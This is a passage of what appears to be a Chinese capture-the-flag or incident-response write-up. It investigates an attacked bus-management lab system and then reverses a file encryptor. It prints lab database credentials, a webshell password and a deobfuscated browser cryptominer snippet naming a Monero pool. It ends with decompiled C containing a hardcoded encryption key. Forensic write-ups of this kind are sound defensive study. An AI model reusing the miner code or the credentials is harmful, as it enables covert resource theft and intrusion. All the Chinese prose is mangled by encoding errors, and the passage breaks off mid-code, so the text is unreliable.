armasm">é»‘å®¢é€šè¿‡è¿œç¨‹æ¡Œé¢æˆåŠŸç™»é™†ç³»ç»Ÿç®¡ç†å‘˜è´¦å·çš„ç½‘ç»œåœ°å€åŠç«¯å£å·ï¼Ÿæäº¤æ ¼å¼ä¸º <span class="hljs-built_in">IP</span>:PORT å¦‚ <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">41110</span><br></code></pre></td></tr></table></figure><p>ç»§ç»­çœ‹æ—¥å¿—å‘ç°åœ¨ 17:09:41 æ—¶è¿›è¡Œ rdp è¿æ¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/b88cfcd8500d0859.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.186.139:49197</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡1ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">é¢˜ç›®æè¿°</span><br><span class="language-xml">åˆ†æç¯å¢ƒå†…çš„ä¸­é—´ä»¶æ—¥å¿—ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¼æ´(é»‘å®¢è·å–æ•°æ®çš„æ¼æ´)ï¼Œç„¶åé€šè¿‡åˆ†ææ—¥å¿—ã€æµé‡ï¼Œé€šè¿‡è„šæœ¬è§£å‡ºé»‘å®¢è·å–çš„ç”¨æˆ·å¯†ç æ•°æ®ï¼Œæäº¤è·å–çš„å‰ä¸¤ä¸ªç”¨æˆ·åï¼Œæäº¤æ ¼å¼ï¼šflag</span><span class="hljs-template-variable">&#123;zhangsan-wangli&#125;</span><br></code></pre></td></tr></table></figure><p>ssh è¿ä¸Šä¹‹å ftp æŸ¥çœ‹æ–‡ä»¶ï¼Œåœ¨ web ç›®å½•çš„ src&#x2F;includes è·¯å¾„ä¸‹æ‰¾åˆ° db.php</p><p><img src="https://img.dkdun.cn/v1/2025/12/234a901ffc926d31.png"></p><p>æ‹¿åˆ°ç™»å½•å¯†ç è´¦æˆ·</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -h <span class="hljs-number">127.0.0.1</span> -u bussec -pbussec123.. bus_system<br></code></pre></td></tr></table></figure><p>åœ¨ <code>/var/www/db/</code>å‘ç°æ•°æ®åº“æ–‡ä»¶ bus_system.sqlï¼Œtable ä¸º <code>bus_drivers</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/7c954ff7044e3e72.png"></p><p>ç™»å½•è¿›å»æŸ¥æ‰¾</p><p><img src="https://img.dkdun.cn/v1/2025/12/49f7af6b70397f4b.png"></p><p>éœ€è¦ä»¥ password æ’åº</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;sunyue-chenhao&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡2ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">é»‘å®¢é€šè¿‡è·å–çš„ç”¨æˆ·åå¯†ç ï¼Œåˆ©ç”¨å¯†ç å¤ç”¨æŠ€æœ¯ï¼Œçˆ†ç ´äº†FTPæœåŠ¡ï¼Œåˆ†ææµé‡ä»¥åæ‰¾åˆ°å¼€æ”¾çš„FTPç«¯å£ï¼Œå¹¶æ‰¾åˆ°é»‘å®¢ç™»å½•æˆåŠŸåè·å–çš„ç§å¯†æ–‡ä»¶ï¼Œæäº¤å…¶æ–‡ä»¶ä¸­å†…å®¹ï¼Œæäº¤æ ¼å¼ï¼šflag</span><span class="hljs-template-variable">&#123;xxx&#125;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ find å‘½ä»¤æŸ¥æ‰¾ ftp ç›¸å…³ä¿¡æ¯ï¼Œæ‰¾åˆ°è·¯å¾„ <code>/home/wangqiang/ftp</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/7c8ca9ec1cd34bce.png"></p><p>æŸ¥çœ‹ sensitive_credentials.txt å†…å®¹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">flag&#123;<span class="hljs-attribute">INTERNAL_FTP_ADMIN_PASSWORD</span>=FtpP@ssw0rd_For_Admin_Backup_2025&#125;<br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡3ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">å¯æ¶çš„é»‘å®¢æ‰¾åˆ°äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½ éœ€è¦åˆ†ææ—¥å¿—å’Œæµé‡ä»¥åŠwebå¼€æ”¾çš„ç¨‹åºæ‰¾åˆ°é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæäº¤æœ¨é©¬ä½¿ç”¨çš„å¯†ç ï¼Œæäº¤æ ¼å¼ï¼šflag</span><span class="hljs-template-variable">&#123;password&#125;</span><br></code></pre></td></tr></table></figure><p><code>/var/www/html/public/uploads/</code> ç›®å½•ä¸‹æœ‰ shell1.php</p><p><img src="https://img.dkdun.cn/v1/2025/12/ea6f9d1baa8a79b8.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;woaiwojia&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">åˆ†ææµé‡ï¼Œé»‘å®¢æ¤å…¥äº†ä¸€ä¸ªwebæŒ–çŸ¿æœ¨é©¬ï¼Œè¿™ä¸ªæœ¨é©¬ç°å®æƒ…å†µä¸‹ä¼šåœ¨ç”¨æˆ·è®¿é—®åæ¶ˆè€—ç”¨æˆ·çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿(æœ¬ç¯å¢ƒå·²åšæ— å®³åŒ–å¤„ç†)ï¼Œæäº¤é»‘å®¢ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶æ—¶çš„åˆå§‹åç§°ï¼Œæäº¤æ ¼å¼ï¼šflag</span><span class="hljs-template-variable">&#123;xxx.xxx&#125;</span><br></code></pre></td></tr></table></figure><p>æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ª result1.pcap æµé‡åŒ…ï¼Œä¸‹è½½åˆ°æœ¬åœ°åˆ†æï¼Œç­›é€‰ POST è¯·æ±‚æµé‡ï¼Œæ‰¾åˆ°è¯·æ±‚æ•°æ®</p><p><img src="https://img.dkdun.cn/v1/2025/12/3b9e1a2b90326757.png"></p><p>shell1.php æ˜¯å…¸å‹çš„å“¥æ–¯æ‹‰çš„ webshellï¼Œè§£å¯†è¯·æ±‚æ•°æ®</p><p><img src="https://img.dkdun.cn/v1/2025/12/17159039d2e0b30a.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">flag&#123;<span class="hljs-built_in">map</span>.php&#125;<br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">åˆ†ææµé‡å¹¶ä¸Šæœºæ’æŸ¥ï¼Œé»‘å®¢æ¤å…¥çš„ç½‘é¡µæŒ–çŸ¿æœ¨é©¬æ‰€ä½¿ç”¨çš„çŸ¿æ± åœ°å€æ˜¯ä»€ä¹ˆï¼Œæäº¤çŸ¿æ± åœ°å€(æ’æŸ¥å®Œæ¯•åå¯ä»¥å°è¯•åˆ é™¤å®ƒ)æäº¤æ ¼å¼ï¼šflag&#123;xxxxxxx<span class="hljs-selector-class">.xxxx</span><span class="hljs-selector-class">.xxx</span>:xxxx&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ index.php ä¸­å‘ç°ä¸€æ®µ js ä»£ç ï¼Œè¢«æ··æ·†äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/5efef951dec4c58d.png"></p><p>è®© deepseek åæ··æ·†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// é…ç½®å¯¹è±¡</span><br>    <span class="hljs-keyword">var</span> config = &#123;&#125;;<br>    <span class="hljs-comment">// è®¾ç½®çŸ¿æ± åœ°å€ï¼šgulf.moneroocean.stream:10128 (Monero æŒ–çŸ¿æ± )</span><br>    config.<span class="hljs-property">p</span> = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">103</span>, <span class="hljs-number">117</span>, <span class="hljs-number">108</span>, <span class="hljs-number">102</span>, <span class="hljs-number">46</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">46</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">109</span>, <span class="hljs-number">58</span>, <span class="hljs-number">49</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">56</span>);<br>    <span class="hljs-comment">// è®¾ç½®å»¶è¿Ÿç³»æ•°</span><br>    config.<span class="hljs-property">l</span> = <span class="hljs-number">0.8</span>;<br><br>    <span class="hljs-comment">// ä¸»åŠŸèƒ½å‡½æ•°</span><br>    <span class="hljs-keyword">var</span> execute = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">// ä»»åŠ¡é˜Ÿåˆ—é¡ºåº</span><br>        <span class="hljs-keyword">var</span> steps = <span class="hljs-string">&#x27;4|1|3|0|2&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>);<br>        <span class="hljs-keyword">var</span> stepIndex = <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-comment">// ä¾æ¬¡æ‰§è¡Œé˜Ÿåˆ—ä¸­çš„ä»»åŠ¡</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">switch</span> (steps[stepIndex++]) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    <span class="hljs-comment">// æ­¤æ¡ä»¶æ°¸è¿œä¸ºå‡ï¼ˆéšæœºæ•°0-99ä¸å¯èƒ½&gt;100ï¼‰</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>) &gt; <span class="hljs-number">100</span>) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This will never run&#x27;</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;1&#x27;</span>:<br>                    <span class="hljs-comment">// å¿™ç­‰å¾…ï¼šé˜»å¡çº¦80æ¯«ç§’ï¼ˆ100*0.8ï¼‰</span><br>                    <span class="hljs-keyword">var</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>                    <span class="hljs-keyword">while</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - startTime &lt; <span class="hljs-number">100</span> * config.<span class="hljs-property">l</span>) &#123;<br>                        <span class="hljs-comment">// ç©ºå¾ªç¯åˆ¶é€ CPUå»¶è¿Ÿ</span><br>                    &#125;<br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;2&#x27;</span>:<br>                    <span class="hljs-comment">// å®é™…æ‰§è¡Œåˆ°æ­¤æ­¥æ—¶å‡½æ•°å·²ç»“æŸ</span><br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;3&#x27;</span>:<br>                    <span class="hljs-comment">// ç©ºæ­¥éª¤</span><br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;4&#x27;</span>:<br>                    <span class="hljs-comment">// ç©ºæ­¥éª¤</span><br>                    <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;;<br>    <br>    <span class="hljs-comment">// æ‰§è¡Œå‡½æ•°</span><br>    <span class="hljs-title function_">execute</span>();<br>&#125;)();<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°æŒ–çŸ¿åœ°å€</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flag&#123;gulf<span class="hljs-selector-class">.moneroocean</span><span class="hljs-selector-class">.stream</span>:<span class="hljs-number">10128</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="B02-å¥‡æ€ªçš„åŠ å¯†å™¨"><a href="#B02-å¥‡æ€ªçš„åŠ å¯†å™¨" class="headerlink" title="B02-å¥‡æ€ªçš„åŠ å¯†å™¨"></a>B02-å¥‡æ€ªçš„åŠ å¯†å™¨</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">ç³Ÿç³•ï¼ä¸€ä¸ªå®¢æˆ·çš„æœåŠ¡å™¨çš„ä¸€ä¸ªæ–‡ä»¶è¢«åŠ å¯†äº†ï¼Œä¸ºäº†é˜²æ­¢æ„ŸæŸ“ï¼Œæˆ‘å°†å…¶æ”¾å…¥äº†å›æ”¶ç«™ï¼Œè¯·ä½ å¿«ç‚¹æ¢å¤æˆ‘çš„<span class="hljs-built_in">flag</span>ç”Ÿæˆå™¨ï¼è¿™éå¸¸é‡è¦ï¼ï¼ï¼<br></code></pre></td></tr></table></figure><p>å®šä½åˆ°ä¸»å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_C51500</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  _DWORD *v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp-Ch] [ebp-9Ch]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp-8h] [ebp-98h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp-4h] [ebp-94h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+4h] [ebp-8Ch] BYREF</span><br>  <span class="hljs-type">char</span> v11[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-84h] BYREF</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+18h] [ebp-78h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp+1Ch] [ebp-74h]</span><br>  <span class="hljs-type">void</span> *v14; <span class="hljs-comment">// [esp+20h] [ebp-70h]</span><br>  <span class="hljs-type">char</span> v15; <span class="hljs-comment">// [esp+26h] [ebp-6Ah] BYREF</span><br>  <span class="hljs-type">char</span> v16; <span class="hljs-comment">// [esp+27h] [ebp-69h]</span><br>  <span class="hljs-type">char</span> v17[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+28h] [ebp-68h] BYREF</span><br>  <span class="hljs-type">char</span> v18[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+40h] [ebp-50h] BYREF</span><br>  <span class="hljs-type">char</span> v19[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+58h] [ebp-38h] BYREF</span><br>  <span class="hljs-type">char</span> v20[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [esp+70h] [ebp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v21; <span class="hljs-comment">// [esp+7Fh] [ebp-11h] BYREF</span><br>  <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [esp+8Ch] [ebp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( a1 &gt;= <span class="hljs-number">2</span> )<br>  &#123;<br>    qmemcpy(v20, <span class="hljs-string">&quot;secret_key_1234&quot;</span>, <span class="hljs-keyword">sizeof</span>(v20));<br>    v9 = sub_C535E0(&amp;v15);<br>    v5 = sub_C53F40(&amp;v10, (<span class="hljs-type">int</span>)v20, (<span class="hljs-type">int</span>)&amp;v21);<br>    sub_C54000(v11, *v5, v5[<span class="hljs-number">1</span>], v9);<br>    v22 = <span class="hljs-number">0</span>;<br>    v14 = sub_C53C90(v17, a2[<span class="hljs-number">1</span>]);<br>    v16 = sub_C51C60(v14, <span class="hljs-string">&quot;enc&quot;</span>);<br>    sub_C54B60(v17);<br>    <span class="hljs-keyword">if</span> ( v16 )<br>    &#123;<br>      sub_C53C90(v18, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;FlagGenerator_v1.T1&quot;</span>);<br>      LOBYTE(v22) = <span class="hljs-number">1</span>;<br>      sub_C53C90(v19, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;FlagGenerator_v1.exe&quot;</span>);<br>      LOBYTE(v22) = <span class="hljs-number">2</span>;<br>      sub_C51160((<span class="hljs-type">int</span>)v19, (<span class="hljs-type">int</span>)v18, (<span class="hljs-type">int</span>)v11);<br>      LOBYTE(v22) = <span class="hljs-number">1</span>;<br>      sub_C54B60(v19);<br>      LOBYTE(v22) = <span class="hljs-number">0</span>;<br>      sub_C54B60(v18);<br>      v12 = <span class="hljs-number">0</span>;<br>      v22 = <span class="hljs-number">-1</span>;<br>      sub_C54C00(v11);<br>      <span class="hljs-keyword">return</span> v12;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v8 = a2[<span class="hljs-number">1</span>];<br>      v6 = sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;æœªçŸ¥å‘½ä»¤: &quot;</span>);<br>      sub_C51960(v6, v8);<br>      sub_C54FC0(sub_C53210);<br>      v13 = <span class="hljs-number">1</span>;<br>      v22 = <span class="hljs-number">-1</span>;<br>      sub_C54C00(v11);<br>      <span class="hljs-keyword">return</span> v13;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v7 = *a2;<br>    v2 = sub_C51960((<span class="hljs-type">int</span>)&amp;unk_C82138, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;ç”¨æ³•:\n  åŠ å¯†: &quot;</span>);<br>    v3 = sub_C51960(v2, v7);<br>    sub_C51960(v3, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot; enc&quot;</span>);<br>    sub_C54FC0(sub_C53210);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹ FlagGenerator_v1.exe åŠ å¯†ï¼Œkey ä¸º <code>secret_key_1234</code>ï¼Œ åˆ†æ sub_C51160</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_C51160</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> *v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> *v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">const</span> BYTE *v7; <span class="hljs-comment">// eax</span><br>  BYTE *v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">const</span> CHAR *v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp-Ch] [ebp-1B8h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp-8h] [ebp-1B4h]</span><br>  DWORD v14; <span class="hljs-comment">// [esp-8h] [ebp-1B4h]</span><br>  __int64 v15; <span class="hljs-comment">// 